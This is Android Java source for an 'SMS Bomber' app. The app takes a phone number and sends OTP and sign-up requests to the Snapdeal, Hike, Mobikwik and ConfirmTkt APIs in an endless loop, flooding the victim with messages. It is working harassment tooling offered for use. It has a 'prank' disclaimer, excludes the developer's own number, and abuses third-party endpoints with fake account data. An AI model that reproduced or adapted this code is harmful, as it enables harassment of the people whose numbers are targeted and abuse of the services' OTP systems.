package co.deucate.smsbomber;

import android.annotation.SuppressLint;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.afollestad.ason.Ason;
import com.afollestad.bridge.Bridge;
import com.afollestad.bridge.BridgeException;
import com.awesomedialog.blennersilva.awesomedialoglibrary.AwesomeInfoDialog;
import com.awesomedialog.blennersilva.awesomedialoglibrary.AwesomeNoticeDialog;
import com.awesomedialog.blennersilva.awesomedialoglibrary.interfaces.Closure;
import com.google.android.gms.ads.AdListener;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdView;
import com.google.android.gms.ads.InterstitialAd;
import com.google.android.gms.ads.MobileAds;



@SuppressWarnings("ALL")
public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    String mPhoneNumber;
    EditText mPhoneEt;
    TextView mStatusTV;
    LinearLayout mPhoneLayout;
    AdRequest adRequest;

    private InterstitialAd interstitialAd;

    int a;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (!isNetworkAvailable()) {
            Toast.makeText(this, "Please connect to network", Toast.LENGTH_SHORT).show();
            return;
        }

        AdView adView = findViewById(R.id.mainBottomBannerAd);
        adRequest = new AdRequest.Builder().build();
        adView.loadAd(adRequest);

        MobileAds.initialize(this,"ca-app-pub-8086732239748075~8890173650");

        interstitialAd = new InterstitialAd(this);
        interstitialAd.setAdUnitId("ca-app-pub-8086732239748075/9598708915");
        interstitialAd.loadAd(new AdRequest.Builder().build());


        mPhoneEt = findViewById(R.id.mainPhoneEt);
        mPhoneLayout = findViewById(R.id.linearLayout);
        mStatusTV = findViewById(R.id.mainStatus);

        findViewById(R.id.mainOkBtn).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                mPhoneNumber = mPhoneEt.getText().toString();

                if (interstitialAd.isLoaded()){

                    interstitialAd.show();
                }else {
                    mStatusTV.setText("Please wait 10-15 second. Server is busy.");
                    return;
                }

                if (mPhoneNumber.contains("9664769226")) {
                    mPhoneEt.setError("Bomb on developer of this app dose't make seance");
                    return;
                }

                new SnapdealBomb().execute();

            }
        });

        interstitialAd.setAdListener(new AdListener() {
            @Override
            public void onAdLoaded() {
                Toast.makeText(MainActivity.this, "Server up", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onAdFailedToLoad(int errorCode) {
                Toast.makeText(MainActivity.this, "Error code : "+errorCode, Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onAdOpened() {
                // Code to be executed when the ad is displayed.

            }

            @Override
            public void onAdLeftApplication() {
                // Code to be executed when the user has left the app.
            }

            @Override
            public void onAdClosed() {
                interstitialAd.loadAd(adRequest);
            }
        });


    }

    @Override
    protected void onStart() {
        super.onStart();

        new AwesomeNoticeDialog(this)
                .setTitle("Warning")
                .setMessage("I(Developer of this app) is not responcible for any thing you did with this app. This app is only for prank. If you are not agree with my term and condition please don't use this app. In case you report my app or me i can take action to you.")
                .setColoredCircle(R.color.dialogWarningBackgroundColor)
                .setDialogIconAndColor(R.drawable.ic_dialog_warning, R.color.white)
                .setCancelable(true)
                .setButtonText(getString(R.string.dialog_ok_button))
                .setButtonBackgroundColor(R.color.dialogWarningBackgroundColor)
                .setButtonText(getString(R.string.dialog_ok_button))
                .setNoticeButtonClick(new Closure() {
                    @Override
                    public void exec() {

                    }
                })
                .show();

    }

    @SuppressWarnings("UnusedAssignment")
    @SuppressLint("StaticFieldLeak")
    private class SnapdealBomb extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... voids) {

            new Thread(new Runnable() {
                @Override
                public void run() {

                    Object localObject2 = new Ason();
                    ((Ason) localObject2).put("firstName", "Popol");
                    ((Ason) localObject2).put("middleName", "Lopol");
                    ((Ason) localObject2).put("password", "bomber69");
                    ((Ason) localObject2).put("requestProtocol", "PROTOCOL_JSON");
                    ((Ason) localObject2).put("responseProtocol", "PROTOCOL_JSON");
                    ((Ason) localObject2).put("mobileNumber", mPhoneNumber);
                    try {
                        localObject2 = Bridge.post("https://mobileapi.snapdeal.com/service/user/signUpWithMobileOnly"
                                , new Object[0]).header("v", "6.1.9").header("api_key", "snapdeal").header("User-Agent", "android")
                                .body((Ason) localObject2).request().response();

                        Log.d(TAG, "run: +");

                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                mStatusTV.setText("Snapdeal");
                            }
                        });

                    } catch (BridgeException e) {
                        e.printStackTrace();
                    }

                }
            }).start();

            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            new HikeBomb().execute();

        }
    }

    @SuppressLint("StaticFieldLeak")
    private class HikeBomb extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... voids) {

            new Thread(new Runnable() {
                @Override
                public void run() {

                    Object localObject = new Ason();
                    ((Ason) localObject).put("method", "pin");
                    ((Ason) localObject).put("msisdn", "+91".concat(mPhoneNumber));
                    try {
                        localObject = Bridge.post("http://api.im.hike.in/v3/account/validate?digits=4").body((Ason) localObject).request().response();

                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                mStatusTV.setText("Hike");
                            }
                        });
                    } catch (BridgeException e) {
                        e.printStackTrace();
                    }

                }
            }).start();

            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            new MobikwickBomb().execute();

        }
    }

    private class MobikwickBomb extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... voids) {

            new Thread(new Runnable() {
                @Override
                public void run() {

                    Object localObject1 = new Ason();
                    ((Ason) localObject1).put("cell", mPhoneNumber);
                    try {
                        localObject1 = Bridge.post("https://appapi.mobikwik.com/p/account/otp/cell", new Object[0])
                                .header("User-Agent", "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G920I Build/NRD90M")
                                .header("X-App-Ver", "1").header("X-MClient", "3").body((Ason) localObject1).request().response();
                        Log.d(TAG, "run: "+localObject1.toString());
                        if (localObject1.toString() == "200") {
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    mStatusTV.setText("Mobikwick");
                                }
                            });
                        }

                    } catch (BridgeException e) {
                        e.printStackTrace();
                    }

                }
            }).start();


            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            new ConfirmTktBomb().execute();

        }
    }

    private boolean isNetworkAvailable() {
        ConnectivityManager connectivityManager
                = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }

    @SuppressLint("StaticFieldLeak")
    private class ConfirmTktBomb extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... voids) {

            new Thread(new Runnable() {
                @Override
                public void run() {

                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            WebView webView = new WebView(MainActivity.this);
                            webView.loadUrl("https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + mPhoneNumber);
                            webView.setWebViewClient(new WebViewClient());
                            mStatusTV.setText("ConfirmTKT");
                        }
                    });

                }
            }).start();

            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            new SnapdealBomb().execute();

        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.overflow,menu);
        return super.onCreateOptionsMenu(menu);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {

        switch (item.getItemId()){
            case R.id.menuAbout:{
                new AwesomeInfoDialog(this)
                        .setTitle("Created by deucate")
                        .setMessage("Deucate is one man army compony started and maintained by kartik patel.")
                        .setColoredCircle(R.color.dialogInfoBackgroundColor)
                        .setDialogIconAndColor(R.drawable.ic_dialog_info, R.color.white)
                        .setCancelable(true)
                        .setPositiveButtonText("Ok")
                        .setPositiveButtonbackgroundColor(R.color.dialogInfoBackgroundColor)
                        .setPositiveButtonTextColor(R.color.white)
                        .setPositiveButtonClick(new Closure() {
                            @Override
                            public void exec() {
                                //click
                            }
                        })
                        .show();
                return true;
            }

            case R.id.menuWeb:{
                Toast.makeText(this, "Website is under contruction", Toast.LENGTH_SHORT).show();
                //Todo parse through the website deucate.co
                return true;
            }
            default:{
                return super.onOptionsItemSelected(item);
            }
        }

    }
}
